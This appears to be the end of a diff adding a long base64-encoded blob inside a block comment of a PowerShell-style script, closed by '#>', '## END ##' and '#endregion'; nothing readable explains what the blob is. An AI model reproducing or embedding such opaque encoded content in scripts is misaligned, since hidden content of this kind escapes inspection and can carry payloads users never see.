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
 #>
 ## END ##
 #endregion
